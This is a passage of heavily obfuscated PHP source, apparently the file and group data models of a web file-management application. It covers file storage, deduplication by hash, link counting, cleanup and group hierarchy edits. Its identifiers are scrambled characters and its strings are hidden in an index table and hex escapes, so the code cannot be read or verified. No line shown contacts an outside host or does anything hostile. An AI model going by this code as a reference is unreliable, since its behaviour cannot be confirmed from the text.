$ÔĞêâ·î = Model($÷¤û¨š‡[560])->field($¤ë­ÖŒå)->where(array($÷¤û¨š‡[558] => $Ü•õ˜íÆ))->find(); $›†ÌıêÁ[$Ü•õ˜íÆ] = $ÔĞêâ·î; } return $›†ÌıêÁ[$Ü•õ˜íÆ]; } public function addFileByContent($„ÙÑƒÃ¦ = '', $‡ğØúì—, $ øâúƒØ = '') { $“åÉ¾â =& $_SERVER[©—Ò»ÅĞ]; $¹÷†Œ‡ = TEMP_PATH . $“åÉ¾â[2235]; if (!is_dir($¹÷†Œ‡)) { mk_dir($¹÷†Œ‡); } $á»Ò®‘É = $¹÷†Œ‡ . $“åÉ¾â[2236] . rand_string(16); $êÊ»ÍëÏ = file_put_contents($á»Ò®‘É, $„ÙÑƒÃ¦); if ($êÊ»ÍëÏ === !1 || strlen($„ÙÑƒÃ¦) != $êÊ»ÍëÏ) { return !1; } $Ù•‡Ã¨û = $this->addFile($á»Ò®‘É, $‡ğØúì—, $ øâúƒØ, !0); if (file_exists($á»Ò®‘É)) { @unlink($á»Ò®‘É); } return $Ù•‡Ã¨û; } public function createFileName($ŠØÍËåí, $ÔÇ€¯ŞË, $ŒœË²“ë = false, $½¢ÆşŠã = false) { $Ø×Ùüî§ =& $_SERVER[©—Ò»ÅĞ]; $€Å§Äœƒ = IO::init($Ø×Ùüî§[8]); $ˆòŠ¢¾ = $this->_makeFilePath($ŠØÍËåí, $ÔÇ€¯ŞË, $€Å§Äœƒ, $ŒœË²“ë, $½¢ÆşŠã); $Œ­§İƒ = $€Å§Äœƒ->pathFather($ˆòŠ¢¾); static $‡îñù±— = false; $Š§«¸Ä = $Ø×Ùüî§[2237] . md5($Œ­§İƒ); if (!$‡îñù±— && !Cache::get($Š§«¸Ä)) { $‡îñù±— = !0; $Óõ¸û©« = IO::mkdir($Œ­§İƒ); if (!IO::exist($Óõ¸û©« . $Ø×Ùüî§[899])) { IO::mkfile($Óõ¸û©« . $Ø×Ùüî§[899]); } Cache::set($Š§«¸Ä, 1, 3600 * 2); } return $ˆòŠ¢¾; } public function _makeFilePath($ø„»¢¨Ô, $ÏÇßèÆ‰, $û–ÖÄ¨Ñ, $òŞ¹¨ß® = false, $öÇàì” = false) { $ü¡‰Ö¡ =& $_SERVER[©—Ò»ÅĞ]; $¦¶õÒÂ = Model($ü¡‰Ö¡[873])->get($ü¡‰Ö¡[2238]); $ Ö¾¡È™ = $ü¡‰Ö¡[1427] . $ÏÇßèÆ‰[$ü¡‰Ö¡[487]] . $ü¡‰Ö¡[499] . date($ü¡‰Ö¡[2239]); $ŞâÎÎÇû = $ Ö¾¡È™ . rand_string(5) . short_id(100); $ø„»¢¨Ô = str_replace($ü¡‰Ö¡[8], $ü¡‰Ö¡[11], KodIO::clear($ø„»¢¨Ô)); $ñÀ›“À¼ = $û–ÖÄ¨Ñ->ext($ø„»¢¨Ô); if (!$ø„»¢¨Ô) { $¦¶õÒÂ = $ü¡‰Ö¡[944]; } switch ($¦¶õÒÂ) { case $ü¡‰Ö¡[2240]: if ($ñÀ›“À¼) { $ŞâÎÎÇû = $ŞâÎÎÇû . $ü¡‰Ö¡[10] . $ñÀ›“À¼; } if ($ñÀ›“À¼ == $ü¡‰Ö¡[2175]) { $ŞâÎÎÇû .= $ü¡‰Ö¡[1396]; } break; case $ü¡‰Ö¡[2241]: $İæ€¬ç = Model($ü¡‰Ö¡[873])->get($ü¡‰Ö¡[874]); $ÜøèŒë¯ = substr(md5($ü¡‰Ö¡[875] . $İæ€¬ç . date($ü¡‰Ö¡[849])), 0, 8); $ Ö¾¡È™ = $ü¡‰Ö¡[1427] . $ÏÇßèÆ‰[$ü¡‰Ö¡[487]] . $ü¡‰Ö¡[499] . date($ü¡‰Ö¡[2242]) . $ÜøèŒë¯ . $ü¡‰Ö¡[8]; if ($ñÀ›“À¼ == $ü¡‰Ö¡[2175]) { $ø„»¢¨Ô .= $ü¡‰Ö¡[1396]; } $Î©ªàœµ = $ü¡‰Ö¡[2243] . $ Ö¾¡È™ . $ø„»¢¨Ô; CacheLock::lock($Î©ªàœµ); $ŞâÎÎÇû = $ Ö¾¡È™ . $ø„»¢¨Ô; if (IO::exist($ Ö¾¡È™ . $ø„»¢¨Ô)) { $êø²› = substr($ø„»¢¨Ô, 0, strlen($ø„»¢¨Ô) - strlen($ñÀ›“À¼)); $õ›»¡ğ¶ = $öÇàì” ? substr($öÇàì”, 0, 5) : ($òŞ¹¨ß® ? substr($òŞ¹¨ß®, 0, 5) : rand_string(5)); $õ›»¡ğ¶ .= rand_string(3); $ŞâÎÎÇû = $ Ö¾¡È™ . $êø²› . $õ›»¡ğ¶; if ($ñÀ›“À¼) { $ŞâÎÎÇû = $ŞâÎÎÇû . $ü¡‰Ö¡[10] . $ñÀ›“À¼; } } if (IO::isOsDriver($ŞâÎÎÇû) && !IO::isUploadServer($ŞâÎÎÇû)) { if (IO::exist($ŞâÎÎÇû)) { CacheLock::unlock($Î©ªàœµ); return $ŞâÎÎÇû; } $­À³ŒµŠ = IO::setContent($ŞâÎÎÇû, $ü¡‰Ö¡[12]); if (!$­À³ŒµŠ) { show_json($ü¡‰Ö¡[2244], !1); } } CacheLock::unlock($Î©ªàœµ); break; case $ü¡‰Ö¡[944]: break; default: break; } return $ŞâÎÎÇû; } public function addFileByRemote($ÇÉˆó¶“, $÷à¦Ÿ¾, $áïªÙŸñ = array()) { $ä¢™ÍóÂ =& $_SERVER[©—Ò»ÅĞ]; if (!IO::isFile($ÇÉˆó¶“)) { return !1; } $»²£‹É¨ = $áïªÙŸñ[$ä¢™ÍóÂ[563]] ? $áïªÙŸñ[$ä¢™ÍóÂ[563]] : $ä¢™ÍóÂ[12]; $Öµ‹¶è® = IO::hashMd5($ÇÉˆó¶“, $»²£‹É¨); $í¸†ÉÂÄ = KodIO::parse($ÇÉˆó¶“); $ûÇøë€ = array($ä¢™ÍóÂ[640] => IO::size($ÇÉˆó¶“), $ä¢™ÍóÂ[2245] => 1, $ä¢™ÍóÂ[509] => $÷à¦Ÿ¾, $ä¢™ÍóÂ[915] => $í¸†ÉÂÄ[$ä¢™ÍóÂ[487]], $ä¢™ÍóÂ[510] => $ÇÉˆó¶“, $ä¢™ÍóÂ[2246] => $áïªÙŸñ[$ä¢™ÍóÂ[694]] ? $áïªÙŸñ[$ä¢™ÍóÂ[694]] : IO::hashSimple($ÇÉˆó¶“), $ä¢™ÍóÂ[2247] => $Öµ‹¶è® ? $Öµ‹¶è® : $»²£‹É¨); if ($ô£…€½ê = $this->addFileCheckExist($ûÇøë€[$ä¢™ÍóÂ[694]], $ûÇøë€[$ä¢™ÍóÂ[563]], $ûÇøë€[$ä¢™ÍóÂ[79]])) { return $ô£…€½ê; } return $this->addFileData($ûÇøë€); } private function addFileData($¸îÎ›§Ø) { $ìŸÁ¥äª =& $_SERVER[©—Ò»ÅĞ]; if (!$¸îÎ›§Ø) { return !1; } if (!IO::isFile($¸îÎ›§Ø[$ìŸÁ¥äª[87]])) { return !1; } $¸îÎ›§Ø[$ìŸÁ¥äª[79]] = intval($¸îÎ›§Ø[$ìŸÁ¥äª[79]]); if (!$¸îÎ›§Ø[$ìŸÁ¥äª[79]] && strlen($¸îÎ›§Ø[$ìŸÁ¥äª[694]]) > 32) { $¸îÎ›§Ø[$ìŸÁ¥äª[79]] = intval(substr($¸îÎ›§Ø[$ìŸÁ¥äª[694]], 32)); } $áóÙ’ç = $this->add($¸îÎ›§Ø); return $this->find($áóÙ’ç); } public function addFile($¸ÚáÉ¥, $¤Ù“ç¢Ê, $™Ê, $š½˜­Ôé = false) { $»èÒ‰±Å =& $_SERVER[©—Ò»ÅĞ]; $Å„Ñ€ù‚ = IO::hashSimple($¸ÚáÉ¥); $ÀÈÚ˜”ê = IO::size($¸ÚáÉ¥); $ÜÍğ¥Ã = $ÀÈÚ˜”ê <= 1024 * 1024 * 10 ? IO::hashMd5($¸ÚáÉ¥) : $»èÒ‰±Å[12]; $Ÿá‘©öş = $»èÒ‰±Å[2248] . $Å„Ñ€ù‚; CacheLock::lock($Ÿá‘©öş); if ($ÜÍğ¥Ã && $Å„Ñ€ù‚) { $£—’ê©ú = $this->addFileCheckExist($Å„Ñ€ù‚, $ÜÍğ¥Ã, $ÀÈÚ˜”ê); if ($£—’ê©ú) { CacheLock::unlock($Ÿá‘©öş); return $£—’ê©ú; } } $Ãô–¶È® = $this->addFileMake($¸ÚáÉ¥, $¤Ù“ç¢Ê, $ÀÈÚ˜”ê, $Å„Ñ€ù‚, $ÜÍğ¥Ã, $™Ê, $š½˜­Ôé); $©¸ª¤âø = $this->addFileData($Ãô–¶È®); if (!$©¸ª¤âø) { return !1; } CacheLock::unlock($Ÿá‘©öş); if (!$ÜÍğ¥Ã && $©¸ª¤âø) { $this->fileMd5Check($©¸ª¤âø); } return $©¸ª¤âø; } public function fileMd5Check($âê–Á½Ğ) { $Ô—Í¥ë =& $_SERVER[©—Ò»ÅĞ]; $Ù„Æ€ú± = array($âê–Á½Ğ[$Ô—Í¥ë[557]], $âê–Á½Ğ[$Ô—Í¥ë[87]]); $ÏÅÀœš¹ = $Ô—Í¥ë[2249] . $âê–Á½Ğ[$Ô—Í¥ë[87]]; $’®¨ÁÍÑ = $Ô—Í¥ë[2250] . $âê–Á½Ğ[$Ô—Í¥ë[557]]; TaskQueue::add($Ô—Í¥ë[2251], $Ù„Æ€ú±, $ÏÅÀœš¹, $’®¨ÁÍÑ); } public function fileMd5Set($±š¡ĞØÂ, $–ù¸¥Ã¼) { $Õè–ÉªÎ =& $_SERVER[©—Ò»ÅĞ]; $ÆÏŒáª² = $this->find($±š¡ĞØÂ); if (!$ÆÏŒáª² || $ÆÏŒáª²[$Õè–ÉªÎ[563]]) { return; } $õı‘ª³¹ = IO::hashMd5($–ù¸¥Ã¼); if (!$õı‘ª³¹) { return $Õè–ÉªÎ[12]; } $this->where(array($Õè–ÉªÎ[557] => $±š¡ĞØÂ))->save(array($Õè–ÉªÎ[563] => $õı‘ª³¹)); } public function addFileMake($°÷É·Öè, $ö¬„¦¢˜, $üµ•ÈÙê, $‰Ğ˜Ùä¤, $ªôÙ×¦„, $ò½ãè½, $¿ê—İáœ) { $ûœ¶£ôÏ =& $_SERVER[©—Ò»ÅĞ]; $¾ø÷¿Û… = $this->createFileName($ò½ãè½, $ö¬„¦¢˜, $‰Ğ˜Ùä¤, $ªôÙ×¦„); $ÕÜ÷ªÚÀ = get_path_father($¾ø÷¿Û…); $¤ÛâìÉô = get_path_this($¾ø÷¿Û…); if ($¿ê—İáœ) { $Í†½í— = IO::move($°÷É·Öè, $ÕÜ÷ªÚÀ, !1, $¤ÛâìÉô); } else { $Í†½í— = IO::copy($°÷É·Öè, $ÕÜ÷ªÚÀ, !1, $¤ÛâìÉô); } if (!$Í†½í—) { return !1; } $Ì†§¿İ¥ = IO::init($Í†½í—); $Ì†§¿İ¥->cacheMethod($ûœ¶£ôÏ[179], $Ì†§¿İ¥->path, $ûœ¶£ôÏ[176]); if (IO::size($Í†½í—) != $üµ•ÈÙê) { return !1; } $†ïÏ¸¢ = array($ûœ¶£ôÏ[640] => $üµ•ÈÙê, $ûœ¶£ôÏ[2245] => 1, $ûœ¶£ôÏ[509] => $ò½ãè½, $ûœ¶£ôÏ[915] => $ö¬„¦¢˜[$ûœ¶£ôÏ[487]], $ûœ¶£ôÏ[510] => $¾ø÷¿Û…, $ûœ¶£ôÏ[2246] => $‰Ğ˜Ùä¤, $ûœ¶£ôÏ[2247] => $ªôÙ×¦„); return $†ïÏ¸¢; } public function addFileCheckExist($œîàÔé, $‘—ÎÛ¨ğ, $ª•¤‡·€) { $•İä¦êÁ =& $_SERVER[©—Ò»ÅĞ]; $ü¨ñŒ³ = $this->findByHash($œîàÔé, $‘—ÎÛ¨ğ); if (!$ü¨ñŒ³) { return !1; } $®ˆ±Ÿõ™ = array($•İä¦êÁ[2245] => intval($ü¨ñŒ³[$•İä¦êÁ[2252]]) + 1, $•İä¦êÁ[640] => $ª•¤‡·€); $this->where(array($•İä¦êÁ[558] => $ü¨ñŒ³[$•İä¦êÁ[557]]))->save($®ˆ±Ÿõ™); return $ü¨ñŒ³; } public function remove($§´ë¢¢) { $this->linkCountChange($§´ë¢¢, !1); $this->clearEmpty(); return !0; } public function linkAdd($‹Ü»¾ğÈ) { $this->linkCountChange($‹Ü»¾ğÈ, !0); } public function linkCountChange($„×å‹ıà, $³×îƒ©) { $®Ø§ğ¤ê =& $_SERVER[©—Ò»ÅĞ]; if (!$„×å‹ıà) { return; } if (!is_array($„×å‹ıà)) { $„×å‹ıà = array($„×å‹ıà); } $ÖåÖ¿‡ô = array(); foreach ($„×å‹ıà as $êêİŒ‘Ş) { $üûøÂË´ = $êêİŒ‘Ş . $®Ø§ğ¤ê[12]; if (!$ÖåÖ¿‡ô[$üûøÂË´]) { $ÖåÖ¿‡ô[$üûøÂË´] = 0; } $ÖåÖ¿‡ô[$üûøÂË´]++; } $œ´ªŠ¼ç = array(); foreach ($ÖåÖ¿‡ô as $êêİŒ‘Ş => $Õ¢ùÇ»æ) { $üûøÂË´ = $Õ¢ùÇ»æ . $®Ø§ğ¤ê[12]; if (!$œ´ªŠ¼ç[$üûøÂË´]) { $œ´ªŠ¼ç[$üûøÂË´] = array(); } $œ´ªŠ¼ç[$üûøÂË´][] = $êêİŒ‘Ş; } foreach ($œ´ªŠ¼ç as $Õ¢ùÇ»æ => $²àÂÑÙ§) { if (!$²àÂÑÙ§) { continue; } $Õ¢ùÇ»æ = $³×îƒ© ? $Õ¢ùÇ»æ : -intval($Õ¢ùÇ»æ); $Î­ŒÀÏÌ = array($®Ø§ğ¤ê[557] => array($®Ø§ğ¤ê[7], $²àÂÑÙ§)); if ($Õ¢ùÇ»æ < 0) { $Î­ŒÀÏÌ[$®Ø§ğ¤ê[2252]] = array($®Ø§ğ¤ê[1183], abs($Õ¢ùÇ»æ)); } $this->where($Î­ŒÀÏÌ)->setAdd($®Ø§ğ¤ê[2252], $Õ¢ùÇ»æ); } } public function findByHash($—şÄƒ¢É, $„á—ŠÒª = false) { $½€÷µæ¨ =& $_SERVER[©—Ò»ÅĞ]; if (!$—şÄƒ¢É && !$„á—ŠÒª) { return !1; } $©¨Ä ßµ = array($½€÷µæ¨[2246] => $—şÄƒ¢É); if ($„á—ŠÒª) { $©¨Ä ßµ = array($½€÷µæ¨[2247] => $„á—ŠÒª); } return $this->order($½€÷µæ¨[2253])->where($©¨Ä ßµ)->find(); } public function clearEmpty($£í²ÃüØ = 1) { $¹Ÿ„áò· =& $_SERVER[©—Ò»ÅĞ]; $®Ì¨İšù = time() - 3600 * 24 * $£í²ÃüØ; $“ü‹…Ôã = $¹Ÿ„áò·[2254] . $®Ì¨İšù; $©Ø™â = $this->where($“ü‹…Ôã)->select(); if (!$©Ø™â) { return; } $õ˜Áûòö = new Task($¹Ÿ„áò·[2255], $¹Ÿ„áò·[12], count($©Ø™â)); foreach ($©Ø™â as $ú¸Ï´°) { $õ˜Áûòö->update(1); $this->resetFile($ú¸Ï´°); } $õ˜Áûòö->end(); } public function resetFile($×“©Æ ú) { $ÚÍìİœş =& $_SERVER[©—Ò»ÅĞ]; $´Ó¹ ½ = array($ÚÍìİœş[558] => $×“©Æ ú[$ÚÍìİœş[557]]); $‡Üµ‹Í¯ = Model($ÚÍìİœş[1533])->where($´Ó¹ ½)->count(); $Úœî“ßØ = Model($ÚÍìİœş[2256])->where($´Ó¹ ½)->count(); $Úµ“¼šÄ = intval($‡Üµ‹Í¯) + intval($Úœî“ßØ); if ($Úµ“¼šÄ == 0) { Model($ÚÍìİœş[2257])->delete($×“©Æ ú[$ÚÍìİœş[557]]); $this->where($´Ó¹ ½)->delete(); $this->metaSet($×“©Æ ú[$ÚÍìİœş[557]], null, null); if (!IO::isFile($×“©Æ ú[$ÚÍìİœş[87]])) { write_log(array($ÚÍìİœş[2258], ACTION, $×“©Æ ú), $ÚÍìİœş[1371]); return !1; } IO::remove($×“©Æ ú[$ÚÍìİœş[87]]); write_log(ACTION . $ÚÍìİœş[986] . KodUser::id() . $ÚÍìİœş[2259] . $×“©Æ ú[$ÚÍìİœş[557]] . $ÚÍìİœş[2046] . $×“©Æ ú[$ÚÍìİœş[79]] . $ÚÍìİœş[199] . $×“©Æ ú[$ÚÍìİœş[87]], $ÚÍìİœş[2258]); return; } if ($×“©Æ ú[$ÚÍìİœş[2252]] != $Úµ“¼šÄ) { $this->where($´Ó¹ ½)->save(array($ÚÍìİœş[2245] => $Úµ“¼šÄ)); } } public function storageInfo($õö·‚¿Ñ = false) { $•¢çå²ã =& $_SERVER[©—Ò»ÅĞ]; $ºƒ×òßÜ = $this->count() + 0.0; $ ¬æë = 0; $Íßûø¢ª = 1; $Ïï±¸°ù = 0; $Èô‹¶•Ä = 5000; for ($Ò¦ÎÅøÖ = 0; $Ò¦ÎÅøÖ < $ºƒ×òßÜ; $Ò¦ÎÅøÖ = $Ò¦ÎÅøÖ + $Èô‹¶•Ä) { $¢ãù™ = $this->limit($Ò¦ÎÅøÖ, $Èô‹¶•Ä)->select(); foreach ($¢ãù™ as $ûä«»ö”) { $Íßûø¢ª += $ûä«»ö”[$•¢çå²ã[79]] * $ûä«»ö”[$•¢çå²ã[2252]]; $ ¬æë += $ûä«»ö”[$•¢çå²ã[79]] * ($ûä«»ö”[$•¢çå²ã[2252]] - 1); $Ïï±¸°ù += $ûä«»ö”[$•¢çå²ã[2252]]; } } $„àåƒ” = array($•¢çå²ã[2260] => $Íßûø¢ª, $•¢çå²ã[2261] => $ ¬æë, $•¢çå²ã[2262] => $ ¬æë / $Íßûø¢ª, $•¢çå²ã[83] => $ºƒ×òßÜ, $•¢çå²ã[2263] => $Ïï±¸°ù); return $„àåƒ”; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\x6c\x65\x4e\141\155\x65" => "\147\x72\157\165\x70\137\155\145\x74\141", "\155\145\x74\x61\106\x69\145\x6c\x64" => "\147\162\157\x75\x70\x49\104"); protected function cacheFunctionAlias($­–¡›ÈŠ) { $ùŸÇ „Å =& $_SERVER[©—Ò»ÅĞ]; return array($ùŸÇ „Å[2264] => array($­–¡›ÈŠ[0], $ùŸÇ „Å[2265]), $ùŸÇ „Å[2266] => array($­–¡›ÈŠ[0], $ùŸÇ „Å[2267])); } protected function ___getInfo($à§¦ÂÊ—) { $˜äÇú«Ï = $this->getInfoSimple($à§¦ÂÊ—); if (!$˜äÇú«Ï) { return !1; } return $this->_listDataApplyItem($˜äÇú«Ï); } protected function ___getInfoSimple($é€¢¤¢Å) { $æùˆÉàË = array($_SERVER[©—Ò»ÅĞ][1495] => intval($é€¢¤¢Å)); $«€Ò©ñë = $this->where($æùˆÉàË)->find(); return is_array($«€Ò©ñë) ? $«€Ò©ñë : array(); } protected function groupAdd($¹ºÛ…â) { $é²¿×­Õ =& $_SERVER[©—Ò»ÅĞ]; if (!$¹ºÛ…â[$é²¿×­Õ[190]] && isset($¹ºÛ…â[$é²¿×­Õ[1495]]) && $¹ºÛ…â[$é²¿×­Õ[1495]] == 1) { if ($êš½¦¦æ = $this->getInfoSimple($¹ºÛ…â[$é²¿×­Õ[1495]], !0)) { return $¹ºÛ…â[$é²¿×­Õ[1495]]; } } else { $êš½¦¦æ = $this->getInfoSimple($¹ºÛ…â[$é²¿×­Õ[190]]); if (!$êš½¦¦æ) { return !1; } } $µªø„¶à = $é²¿×­Õ[613]; if ($êš½¦¦æ[$é²¿×­Õ[604]]) { $µªø„¶à = $êš½¦¦æ[$é²¿×­Õ[604]] . $êš½¦¦æ[$é²¿×­Õ[1495]] . $é²¿×­Õ[50]; } $ßí¶á¶Â = array($é²¿×­Õ[509] => $this->groupNameAuto($¹ºÛ…â[$é²¿×­Õ[190]], $¹ºÛ…â[$é²¿×­Õ[32]]), $é²¿×­Õ[492] => $¹ºÛ…â[$é²¿×­Õ[190]], $é²¿×­Õ[674] => $µªø„¶à, $é²¿×­Õ[2268] => $¹ºÛ…â[$é²¿×­Õ[2169]], $é²¿×­Õ[2269] => 0, $é²¿×­Õ[2187] => 0); $¹ºÛ…â[$é²¿×­Õ[32]] = $ßí¶á¶Â[$é²¿×­Õ[32]]; if (isset($¹ºÛ…â[$é²¿×­Õ[2205]])) { $ßí¶á¶Â[$é²¿×­Õ[2205]] = $¹ºÛ…â[$é²¿×­Õ[2205]]; } else { $‘óÆ…Áæ = $this->max($é²¿×­Õ[2205]); if (!$‘óÆ…Áæ) { $‘óÆ…Áæ = 0; } $ßí¶á¶Â[$é²¿×­Õ[2205]] = $‘óÆ…Áæ + 1; } if (!empty($¹ºÛ…â[$é²¿×­Õ[1495]])) { $ßí¶á¶Â[$é²¿×­Õ[1495]] = $¹ºÛ…â[$é²¿×­Õ[1495]]; } $ä¹ğ‹Úï = $this->add($ßí¶á¶Â); $this->groupMetaEdit($ä¹ğ‹Úï, $¹ºÛ…â); Model($é²¿×­Õ[1533])->groupRootAdd($ä¹ğ‹Úï); $this->_clearCache($¹ºÛ…â[$é²¿×­Õ[190]]); return $ä¹ğ‹Úï; } protected function groupEdit($Ö–Û¼ç¿, $ğÈ®ü¹­) { $‡Ğ¿¼ =& $_SERVER[©—Ò»ÅĞ]; $®í÷×º™ = $this->getInfoSimple($Ö–Û¼ç¿); if (!$®í÷×º™) { return !1; } if (!empty($ğÈ®ü¹­[$‡Ğ¿¼[190]])) { $…‹‘–¶å = $this->getInfoSimple($ğÈ®ü¹­[$‡Ğ¿¼[190]]); if (!$…‹‘–¶å) { return !1; } if ($®í÷×º™[$‡Ğ¿¼[1495]] == $…‹‘–¶å[$‡Ğ¿¼[1495]]) { return !1; } if ($ğÈ®ü¹­[$‡Ğ¿¼[190]] != $®í÷×º™[$‡Ğ¿¼[190]]) { if ($…‹‘–¶å[$‡Ğ¿¼[604]] !== $®í÷×º™[$‡Ğ¿¼[604]] && strpos($…‹‘–¶å[$‡Ğ¿¼[604]], $®í÷×º™[$‡Ğ¿¼[604]] . $®í÷×º™[$‡Ğ¿¼[1495]] . $‡Ğ¿¼[50]) === 0) { return !1; } $ğÈ®ü¹­[$‡Ğ¿¼[674]] = $…‹‘–¶å[$‡Ğ¿¼[604]] . $ğÈ®ü¹­[$‡Ğ¿¼[190]] . $‡Ğ¿¼[50]; $this->_changeChildLevel($®í÷×º™, $…‹‘–¶å); $this->_clearCache($…‹‘–¶å[$‡Ğ¿¼[1495]]); $this->_clearCache($®í÷×º™[$‡Ğ¿¼[190]]); } } $this->groupMetaEdit($Ö–Û¼ç¿, $ğÈ®ü¹­); $this->_clearChildrenCache($®í÷×º™); return $this->where(array($‡Ğ¿¼[2270] => $Ö–Û¼ç¿))->save($ğÈ®ü¹­); } private function groupMetaEdit($ŒãÄ§ÔÆ, &$çæ…ÀÕ») { $©š¦›±Í =& $_SERVER[©—Ò»ÅĞ]; if (isset($çæ…ÀÕ»[$©š¦›±Í[32]])) { $this->setNamePinyin($ŒãÄ§ÔÆ, $çæ…ÀÕ»[$©š¦›±Í[32]]); } if (isset($çæ…ÀÕ»[$©š¦›±Í[2271]])) { $Ø¯ÅÄù” = array($©š¦›±Í[2271] => $çæ…ÀÕ»[$©š¦›±Í[2271]], $©š¦›±Í[2272] => $çæ…ÀÕ»[$©š¦›±Í[2272]]); unset($çæ…ÀÕ»[$©š¦›±Í[2271]]); unset($çæ…ÀÕ»[$©š¦›±Í[2272]]); if (isset($çæ…ÀÕ»[$©š¦›±Í[2273]])) { $­×Şßˆ = $©š¦›±Í[1491] . $ŒãÄ§ÔÆ; $ª‹íØè = $©š¦›±Í[1490]; $·ûØÔÓµ = $çæ…ÀÕ»[$©š¦›±Í[2273]] ? $çæ…ÀÕ»[$©š¦›±Í[2273]] : $©š¦›±Í[12]; $÷ºšíÂ… = Model($©š¦›±Í[1489])->get($­×Şßˆ, $ª‹íØè); $÷ºšíÂ… = $÷ºšíÂ… ? $÷ºšíÂ… : $©š¦›±Í[12]; if ($÷ºšíÂ… != $·ûØÔÓµ) { if (!$·ûØÔÓµ && $÷ºšíÂ…) { Model($©š¦›±Í[1489])->remove($­×Şßˆ, $ª‹íØè); } else { if ($·ûØÔÓµ) { Model($©š¦›±Í[1489])->set($­×Şßˆ, $·ûØÔÓµ, $ª‹íØè); } } } $Ø¯ÅÄù”[$©š¦›±Í[2273]] = $·ûØÔÓµ; } $this->metaSet($ŒãÄ§ÔÆ, $Ø¯ÅÄù”); } } private function _clearChildrenCache($ã—–‘á) { $š·Ôª‘ =& $_SERVER[©—Ò»ÅĞ]; $×²©‘ğ = array($š·Ôª‘[674] => array($š·Ôª‘[635], $ã—–‘á[$š·Ôª‘[604]] . $ã—–‘á[$š·Ôª‘[1495]] . $š·Ôª‘[636])); $Ò¬ÖÅš = $this->field($š·Ôª‘[1495])->where($×²©‘ğ)->select(); foreach ($Ò¬ÖÅš as $ßöÙú·­) { $this->_clearCache($ßöÙú·­[$š·Ôª‘[1495]]); } } private function _clearCache($•„ğÜ…ê) { $Ôİ¬“Éà =& $_SERVER[©—Ò»ÅĞ]; $this->cacheFunctionClear($Ôİ¬“Éà[2274], $•„ğÜ…ê); $this->cacheFunctionClear($Ôİ¬“Éà[2275], $•„ğÜ…ê); } private function _changeChildLevel($ğ“çı, $ô´ĞÖšƒ, $ËØ§¼Ò– = false) { $‹™›¦· =& $_SERVER[©—Ò»ÅĞ]; $Ï®ãÉä = $ğ“çı[$‹™›¦·[604]] . $ğ“çı[$‹™›¦·[1495]] . $‹™›¦·[50]; $»Å‚»™´ = $ô´ĞÖšƒ[$‹™›¦·[604]] . $ô´ĞÖšƒ[$‹™›¦·[1495]] . $‹™›¦·[50] . $ğ“çı[$‹™›¦·[1495]] . $‹™›¦·[50]; if ($ËØ§¼Ò–) { $»Å‚»™´ = $ô´ĞÖšƒ[$‹™›¦·[604]] . $ô´ĞÖšƒ[$‹™›¦·[1495]] . $‹™›¦·[50]; } $ƒÕæ‹Å = array($‹™›¦·[674] => array($‹™›¦·[635], $ğ“çı[$‹™›¦·[604]] . $ğ“çı[$‹™›¦·[1495]] . $‹™›¦·[636])); $éµŒĞâİ = array($‹™›¦·[674] => array($‹™›¦·[683], "\x72\145\160\x6c\x61\143\145\50\160\x61\x72\x65\x6e\x74\x4c\145\x76\x65\x6c\54\47{$Ï®ãÉä}\47\x2c\x27{$»Å‚»™´}\x27\51")); $this->_clearChildrenCache($ğ“çı); $this->where($ƒÕæ‹Å)->data($éµŒĞâİ)->save(); } public function setNamePinyin($…ë¼¾µæ, $¤¹è¥Ÿ‘ = false) { $³Ì‹·‰ =& $_SERVER[©—Ò»ÅĞ]; if (!$¤¹è¥Ÿ‘) { $ê×Ã¦ùû = $this->getInfoSimple($…ë¼¾µæ); $¤¹è¥Ÿ‘ = $ê×Ã¦ùû[$³Ì‹·‰[32]]; } if (!Input::check($¤¹è¥Ÿ‘, $³Ì‹·‰[677])) { $this->metaSet($…ë¼¾µæ, $³Ì‹·‰[552], null); $this->metaSet($…ë¼¾µæ, $³Ì‹·‰[551], null); return; } $¼¤›†ê = array($³Ì‹·‰[552] => str_replace($³Ì‹·‰[53], $³Ì‹·‰[12], Pinyin::get($¤¹è¥Ÿ‘)), $³Ì‹·‰[551] => Pinyin::get($¤¹è¥Ÿ‘, $³Ì‹·‰[678])); $this->metaSet($…ë¼¾µæ, $¼¤›†ê); } protected function metaSet($óÀª‘·ï, $”±¸ ‚ = null, $•×ù”ñ• = null) { $this->_clearCache($óÀª‘·ï); return parent::metaSet($óÀª‘·ï, $”±¸ ‚, $•×ù”ñ•); } protected function groupStatus($ÖéÇª–Ä, $¢‚Æêµ”) { $Ìù„š†¯ =& $_SERVER[©—Ò»ÅĞ]; $ÂÓºˆİ = $this->getInfoSimple($ÖéÇª–Ä); if (!$ÂÓºˆİ) { return !1; } $this->_clearCache($ÖéÇª–Ä); return $this->metaSet($ÖéÇª–Ä, $Ìù„š†¯[850], $¢‚Æêµ”); if ($¢‚Æêµ” == $Ìù„š†¯[91]) { $§ˆß‹Í = $this->parentLevelArray($ÂÓºˆİ[$Ìù„š†¯[604]]); } else { } $§ˆß‹Í[] = $ÂÓºˆİ[$Ìù„š†¯[1495]]; $Ò©ëªÍ = array(); foreach ($§ˆß‹Í as $ÖéÇª–Ä) { $Ò©ëªÍ[] = array($Ìù„š†¯[1495] => $ÖéÇª–Ä, $Ìù„š†¯[95] => $Ìù„š†¯[850], $Ìù„š†¯[451] => $¢‚Æêµ”); $this->_clearCache($ÖéÇª–Ä); } return Model($Ìù„š†¯[2276])->addAll($Ò©ëªÍ, array(), !0); } protected function groupRemove($Ùş˜í‰ , $Œ„ã·» = false) { $†Ö±¨ø =& $_SERVER[©—Ò»ÅĞ]; $€°ûñÕÃ = array($†Ö±¨ø[1495] => $Ùş˜í‰ ); $§Ç¦Ë¯â = $this->where($€°ûñÕÃ)->find(); if (!$§Ç¦Ë¯â || $§Ç¦Ë¯â[$†Ö±¨ø[190]] == 0) { return !1; } if (!$Œ„ã·») { $Îá¯Ø¸‘ = $this->getInfoSimple($§Ç¦Ë¯â[$†Ö±¨ø[190]]); $this->_changeChildLevel($§Ç¦Ë¯â, $Îá¯Ø¸‘, !0); $this->where(array($†Ö±¨ø[190] => $Ùş˜í‰ ))->save(array($†Ö±¨ø[190] => $§Ç¦Ë¯â[$†Ö±¨ø[190]])); $this->_clearCache($Îá¯Ø¸‘[$†Ö±¨ø[1495]]); } Model($†Ö±¨ø[2276])->where($€°ûñÕÃ)->delete(); Model($†Ö±¨ø[2277])->where($€°ûñÕÃ)->delete(); Model($†Ö±¨ø[933])->groupRootRemove($Ùş˜í‰ ); 